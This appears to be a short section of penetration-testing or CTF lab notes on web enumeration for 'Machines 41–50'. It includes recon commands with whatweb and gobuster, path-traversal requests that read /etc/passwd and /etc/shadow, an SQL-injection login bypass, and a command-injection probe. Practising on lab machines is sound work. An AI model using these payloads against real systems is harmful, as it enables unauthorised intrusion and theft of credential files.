## 🌐 Web Enumeration (Machines 41–50)

```bash
# Common Web Recon Tools
whatweb http://<IP>
curl -I http://<IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt

# URLs of interest found:
# - /admin
# - /uploads
# - /config.php
# - /backup
# - /index.php?page=

# LFI Attempts
curl http://<IP>/index.php?page=../../../../etc/passwd
curl http://<IP>/index.php?file=../../../../etc/shadow

# Authentication Bypass / Command Injection
curl http://<IP>/login.php -d "user=admin'--&pass=123"
curl http://<IP>/vuln.php?cmd=whoami

# Notes:
# - Found hidden endpoints using ffuf
# - SSRF via Host header tampering
```